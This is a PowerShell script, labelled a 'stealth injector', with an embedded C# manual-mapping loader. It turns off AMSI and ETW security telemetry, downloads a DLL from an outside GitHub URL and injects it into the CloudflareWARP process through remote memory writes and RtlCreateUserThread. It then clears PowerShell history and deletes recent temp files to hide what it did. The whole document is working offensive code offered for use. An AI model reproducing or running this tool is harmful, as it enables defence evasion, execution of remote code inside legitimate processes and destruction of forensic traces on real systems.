# ============================================================
#  ULTIMATE FIX – NO COMPILATION ERRORS
# ============================================================
[CmdletBinding(SupportsShouldProcess=$true, ConfirmImpact="High")]
param()

Set-StrictMode -Version Latest
$DebugMode = $true

function Write-DebugInfo {
    param($Message, $Color = "Cyan")
    if ($DebugMode) { Write-Host "[DEBUG] $Message" -ForegroundColor $Color }
}

Write-Host "========================================" -ForegroundColor Magenta
Write-Host "      ULTIMATE STEALTH INJECTOR         " -ForegroundColor Magenta
Write-Host "========================================" -ForegroundColor Magenta
Write-DebugInfo "Starting..." -Color "Green"

if (!([bool]([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")))
{
    Write-DebugInfo "❌ Not Admin! Exiting." -Color "Red"
    Read-Host "Press ENTER"
    exit
}
Write-DebugInfo "✅ Admin."

# ---------- AMSI + ETW Bypass ----------
Write-DebugInfo "Bypassing AMSI/ETW..." -Color "Yellow"
try {
    $a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    $a.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
    $a.GetField('amsiSession','NonPublic,Static').SetValue($null,$null)
    Add-Type -TypeDefinition @"
    using System;
    using System.Runtime.InteropServices;
    public class EtwOff {
        [DllImport("ntdll.dll")] static extern int NtSetInformationProcess(IntPtr h, int c, IntPtr i, int l);
        public static void Disable() {
            IntPtr p = System.Diagnostics.Process.GetCurrentProcess().Handle;
            IntPtr ptr = Marshal.AllocHGlobal(4);
            Marshal.WriteInt32(ptr, 0);
            NtSetInformationProcess(p, 0x5E, ptr, 4);
            Marshal.FreeHGlobal(ptr);
        }
    }
"@ -IgnoreWarnings
    [EtwOff]::Disable()
    Write-DebugInfo "✅ Bypassed." -Color "Green"
} catch {
    Write-DebugInfo "❌ Bypass failed: $_" -Color "Red"
    Read-Host "Press ENTER"
    exit
}

# ---------- C# Loader (clean types) ----------
Write-DebugInfo "Compiling C# loader..." -Color "Yellow"
$kernel = @'
using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Diagnostics;

public class ManualMapResult
{
    public IntPtr ImageBase;
    public uint ImageSize;
    public IntPtr DllMainAddr;
    public long Delta;
    public bool Is64Bit;
}

public static class NativeLoader
{
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    static extern IntPtr GetModuleHandleA(string lpModuleName);
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    static extern IntPtr LoadLibraryA(string lpFileName);
    [DllImport("kernel32.dll")]
    static extern bool FlushInstructionCache(IntPtr hProcess, IntPtr lpBaseAddress, UIntPtr dwSize);
    [DllImport("kernel32.dll")]
    static extern IntPtr GetCurrentProcess();
    [DllImport("ntdll.dll")]
    static extern int RtlCreateUserThread(IntPtr ProcessHandle, IntPtr ThreadSecurityDescriptor, bool CreateSuspended, uint StackZeroBits, uint StackReserve, uint StackCommit, IntPtr StartAddress, IntPtr Parameter, out IntPtr ThreadHandle, IntPtr ClientId);
    [DllImport("kernel32.dll")]
    static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
    [DllImport("kernel32.dll")]
    static extern bool CloseHandle(IntPtr hObject);
    [DllImport("kernel32.dll")]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

    const uint PROCESS_ALL_ACCESS = 0x1F0FFF;
    const uint MEM_COMMIT = 0x1000;
    const uint MEM_RESERVE = 0x2000;
    const uint PAGE_READWRITE = 0x04;
    const uint PAGE_EXECUTE_READ = 0x20;
    const uint PAGE_EXECUTE_READWRITE = 0x40;
    const uint PAGE_READONLY = 0x02;

    static ushort U16(byte[] b, int o) => BitConverter.ToUInt16(b, o);
    static uint   U32(byte[] b, int o) => BitConverter.ToUInt32(b, o);
    static ulong  U64(byte[] b, int o) => BitConverter.ToUInt64(b, o);

    static uint   RU32(IntPtr p, long o) => (uint)Marshal.ReadInt32((IntPtr)(p.ToInt64()+o));
    static ushort RU16(IntPtr p, long o) => (ushort)Marshal.ReadInt16((IntPtr)(p.ToInt64()+o));
    static ulong  RU64(IntPtr p, long o) {
        long lo = (long)(uint)Marshal.ReadInt32((IntPtr)(p.ToInt64()+o));
        long hi = (long)(uint)Marshal.ReadInt32((IntPtr)(p.ToInt64()+o+4));
        return (ulong)((hi<<32)|lo);
    }
    static void WU64(IntPtr p, long o, ulong v) => Marshal.WriteInt64((IntPtr)(p.ToInt64()+o), (long)v);
    static void WU32(IntPtr p, long o, uint v) => Marshal.WriteInt32((IntPtr)(p.ToInt64()+o), (int)v);

    static string RAscii(IntPtr p, long o) {
        var sb = new StringBuilder();
        for (int i=0;i<260;i++) {
            byte b = Marshal.ReadByte((IntPtr)(p.ToInt64()+o+i));
            if (b==0) break;
            sb.Append((char)b);
        }
        return sb.ToString();
    }

    static uint SectionProtection(uint characteristics) {
        bool x = (characteristics & 0x20000000) != 0;
        bool w = (characteristics & 0x80000000) != 0;
        bool r = (characteristics & 0x40000000) != 0;
        if (x && w) return PAGE_EXECUTE_READWRITE;
        if (x && r) return PAGE_EXECUTE_READ;
        if (x) return PAGE_EXECUTE_READ;
        if (w) return PAGE_READWRITE;
        return PAGE_READONLY;
    }

    struct Section { public uint VirtualSize, VirtualAddress, SizeOfRawData, PointerToRawData, Characteristics; }

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate bool DllMainDelegate(IntPtr hinstDLL, uint fdwReason, IntPtr lpvReserved);

    public static bool InjectIntoWarp(byte[] dllBytes)
    {
        try {
            Console.WriteLine("[C#] Looking for CloudflareWARP...");
            int pid = 0;
            foreach (var p in Process.GetProcessesByName("CloudflareWARP")) { pid = p.Id; break; }
            if (pid == 0) { Console.WriteLine("[C#] WARP not running."); return false; }
            Console.WriteLine("[C#] Found PID " + pid);

            IntPtr hProc = OpenProcess(PROCESS_ALL_ACCESS, false, (uint)pid);
            if (hProc == IntPtr.Zero) { Console.WriteLine("[C#] OpenProcess failed."); return false; }

            var map = Map(dllBytes, false);
            if (map.ImageBase == IntPtr.Zero) { Console.WriteLine("[C#] Map failed."); return false; }

            Console.WriteLine("[C#] Allocating remote memory...");
            IntPtr remoteBase = VirtualAllocEx(hProc, IntPtr.Zero, (UIntPtr)map.ImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);
            if (remoteBase == IntPtr.Zero) { Console.WriteLine("[C#] VirtualAllocEx failed."); return false; }

            Console.WriteLine("[C#] Copying image...");
            byte[] img = new byte[map.ImageSize];
            Marshal.Copy(map.ImageBase, img, 0, (int)map.ImageSize);
            IntPtr written;
            if (!WriteProcessMemory(hProc, remoteBase, img, (uint)map.ImageSize, out written)) { Console.WriteLine("[C#] WriteProcessMemory failed."); return false; }

            IntPtr entry = (IntPtr)(remoteBase.ToInt64() + (map.DllMainAddr.ToInt64() - map.ImageBase.ToInt64()));
            Console.WriteLine("[C#] Entry at 0x" + entry.ToString("X"));

            IntPtr hThread;
            int status = RtlCreateUserThread(hProc, IntPtr.Zero, false, 0, 0, 0, entry, IntPtr.Zero, out hThread, IntPtr.Zero);
            if (status != 0) { Console.WriteLine("[C#] RtlCreateUserThread failed, status " + status); return false; }

            System.Threading.Thread.Sleep(200);
            CloseHandle(hThread);
            CloseHandle(hProc);
            Console.WriteLine("[C#] Injection complete.");
            return true;
        } catch (Exception ex) {
            Console.WriteLine("[C#] EXCEPTION: " + ex.Message);
            return false;
        }
    }

    private static ManualMapResult Map(byte[] dll, bool callEntry)
    {
        var res = new ManualMapResult();
        if (U16(dll, 0) != 0x5A4D) throw new Exception("Invalid MZ");
        int lfanew = BitConverter.ToInt32(dll, 0x3C);
        if (U32(dll, lfanew) != 0x4550) throw new Exception("Invalid PE");

        int co = lfanew + 4;
        ushort machine = U16(dll, co + 4);
        bool is64 = (machine == 0x8664);
        res.Is64Bit = is64;
        ushort ns = U16(dll, co + 2);
        ushort ohs = U16(dll, co + 16);
        int optOff = co + 20;
        uint epRVA = U32(dll, optOff + 16);
        uint sizeImage = U32(dll, optOff + 56);
        uint sizeHeaders = U32(dll, optOff + 60);
        long imageBase = (long)(is64 ? U64(dll, optOff + 24) : U32(dll, optOff + 28));
        res.ImageSize = sizeImage;

        int dd = is64 ? optOff + 112 : optOff + 96;
        uint importRVA = U32(dll, dd + 8);
        uint relocRVA = U32(dll, dd + 40);
        uint relocSize = U32(dll, dd + 44);

        int secOff = optOff + ohs;
        Section[] sections = new Section[ns];
        for (int i=0; i<ns; i++) {
            int o = secOff + i*40;
            sections[i] = new Section {
                VirtualSize = U32(dll, o+8),
                VirtualAddress = U32(dll, o+12),
                SizeOfRawData = U32(dll, o+16),
                PointerToRawData = U32(dll, o+20),
                Characteristics = U32(dll, o+36)
            };
        }

        IntPtr image = VirtualAlloc(IntPtr.Zero, (UIntPtr)sizeImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (image == IntPtr.Zero) throw new Exception("VirtualAlloc local failed");
        res.ImageBase = image;
        long baseAddr = image.ToInt64();
        long delta = baseAddr - imageBase;
        res.Delta = delta;

        Marshal.Copy(dll, 0, image, (int)sizeHeaders);

        foreach (var s in sections) {
            if (s.SizeOfRawData == 0) continue;
            uint copy = (s.VirtualSize == 0) ? s.SizeOfRawData : Math.Min(s.VirtualSize, s.SizeOfRawData);
            if (s.PointerToRawData + copy > (uint)dll.Length)
                copy = (uint)dll.Length - s.PointerToRawData;
            if (copy == 0) continue;
            Marshal.Copy(dll, (int)s.PointerToRawData, (IntPtr)(baseAddr + s.VirtualAddress), (int)copy);
        }

        // Relocations
        if (relocRVA != 0 && delta != 0) {
            uint rva = relocRVA;
            uint end = relocRVA + relocSize;
            while (rva < end) {
                uint page = RU32(image, rva);
                uint block = RU32(image, rva+4);
                if (block == 0) break;
                int count = (int)(block - 8) / 2;
                for (int i=0; i<count; i++) {
                    ushort entry = RU16(image, rva + 8 + i*2);
                    int type = (entry >> 12) & 0xF;
                    int off = entry & 0xFFF;
                    if (type == 0) continue;
                    long target = page + off;
                    if (type == 10) {
                        ulong val = RU64(image, target);
                        WU64(image, target, (ulong)((long)val + delta));
                    } else if (type == 3) {
                        uint val = RU32(image, target);
                        WU32(image, target, (uint)((long)val + delta));
                    }
                }
                rva += block;
            }
        }

        // Imports (fully fixed with long mask)
        if (importRVA != 0) {
            int idx = 0;
            while (true) {
                long off = importRVA + idx * 20;
                uint lookupRVA = RU32(image, off);
                uint nameRVA = RU32(image, off + 12);
                uint addrRVA = RU32(image, off + 16);
                if (nameRVA == 0) break;

                string dllName = RAscii(image, nameRVA);
                IntPtr hMod = GetModuleHandleA(dllName);
                if (hMod == IntPtr.Zero) hMod = LoadLibraryA(dllName);
                if (hMod == IntPtr.Zero) { idx++; continue; }

                long thunkOff = 0;
                uint thunkBase = (lookupRVA != 0) ? lookupRVA : addrRVA;
                int ptrSize = is64 ? 8 : 4;
                while (true) {
                    long thunkAddr = thunkBase + thunkOff;
                    long thunkVal = (long)(is64 ? RU64(image, thunkAddr) : RU32(image, thunkAddr));
                    if (thunkVal == 0) break;

                    // ----- FIXED BITWISE AND (both long) -----
                    long ordinalMask = is64 ? 0x8000000000000000L : 0x80000000L;
                    IntPtr funcPtr = IntPtr.Zero;
                    if ((thunkVal & ordinalMask) != 0) {
                        uint ordinal = (uint)(thunkVal & 0xFFFFL);
                        funcPtr = GetProcAddress(hMod, (IntPtr)(int)ordinal);
                    } else {
                        string funcName = RAscii(image, thunkVal + 2);
                        funcPtr = GetProcAddress(hMod, funcName);
                    }
                    // ----- FIX END -----

                    if (funcPtr != IntPtr.Zero) {
                        IntPtr iat = (IntPtr)(baseAddr + addrRVA + thunkOff);
                        if (is64) Marshal.WriteInt64(iat, funcPtr.ToInt64());
                        else Marshal.WriteInt32(iat, funcPtr.ToInt32());
                    }
                    thunkOff += ptrSize;
                }
                idx++;
            }
        }

        foreach (var s in sections) {
            uint sz = Math.Max(s.VirtualSize, s.SizeOfRawData);
            if (sz == 0) continue;
            uint prot = SectionProtection(s.Characteristics);
            uint old;
            VirtualProtect((IntPtr)(baseAddr + s.VirtualAddress), (UIntPtr)sz, prot, out old);
        }

        FlushInstructionCache(GetCurrentProcess(), image, (UIntPtr)sizeImage);

        res.DllMainAddr = IntPtr.Zero;
        if (callEntry && epRVA != 0) {
            res.DllMainAddr = (IntPtr)(baseAddr + epRVA);
            try {
                var dllMain = (DllMainDelegate)Marshal.GetDelegateForFunctionPointer(res.DllMainAddr, typeof(DllMainDelegate));
                dllMain(image, 1, IntPtr.Zero);
            } catch { }
        }
        return res;
    }
}
'@

try {
    $compiler = [System.CodeDom.Compiler.CodeDomProvider]::CreateProvider('CSharp')
    $params = New-Object System.CodeDom.Compiler.CompilerParameters
    $params.GenerateInMemory = $true
    $params.GenerateExecutable = $false
    $params.IncludeDebugInformation = $false
    $params.CompilerOptions = '/target:library /optimize+'
    $params.ReferencedAssemblies.AddRange(@('System.dll', 'System.Runtime.InteropServices.dll', 'System.Diagnostics.Process.dll'))
    $result = $compiler.CompileAssemblyFromSource($params, $kernel)
    if ($result.Errors.Count -gt 0) {
        Write-DebugInfo "❌ Compilation error: $($result.Errors[0].ErrorText)" -Color "Red"
        Read-Host "Press ENTER to exit"
        exit
    }
    Write-DebugInfo "✅ Compilation successful." -Color "Green"
} catch {
    Write-DebugInfo "❌ Compilation exception: $_" -Color "Red"
    Read-Host "Press ENTER to exit"
    exit
}

$assembly = $result.CompiledAssembly
$loaderType = $assembly.GetType('NativeLoader')
$method = $loaderType.GetMethod('InjectIntoWarp')

# ---------- Download DLL ----------
Write-DebugInfo "Downloading DLL..." -Color "Yellow"
try {
    $bytes = (New-Object System.Net.WebClient).DownloadData("https://github.com/desert007/bios/raw/refs/heads/main/version.dll")
    Write-DebugInfo "✅ Downloaded $($bytes.Length) bytes." -Color "Green"
} catch {
    Write-DebugInfo "❌ Download failed: $_" -Color "Red"
    Read-Host "Press ENTER"
    exit
}

# ---------- Inject ----------
Write-DebugInfo "Calling injection..." -Color "Yellow"
Write-Host "`n========== C# OUTPUT ==========" -ForegroundColor Magenta
try {
    $success = $method.Invoke($null, @($bytes))
    Write-Host "=================================" -ForegroundColor Magenta
    if ($success) { Write-DebugInfo "✅ Injection succeeded!" -Color "Green" }
    else { Write-DebugInfo "❌ Injection failed." -Color "Red" }
} catch {
    Write-Host "=================================" -ForegroundColor Magenta
    Write-DebugInfo "❌ Injection error: $_" -Color "Red"
}

# ---------- Cleanup ----------
Write-DebugInfo "Cleaning up..." -Color "Yellow"
[GC]::Collect(); [GC]::WaitForPendingFinalizers()
Clear-History
$hp = (Get-PSReadlineOption).HistorySavePath
if (Test-Path $hp) { Clear-Content -Path $hp -Force }
Get-ChildItem $env:TEMP -Filter "*.cs" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ea 0
Get-ChildItem $env:TEMP -Filter "*.dll" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ea 0
Write-DebugInfo "✅ Cleanup done." -Color "Green"

Write-DebugInfo "Finished. Press ENTER to exit." -Color "Magenta"
Read-Host
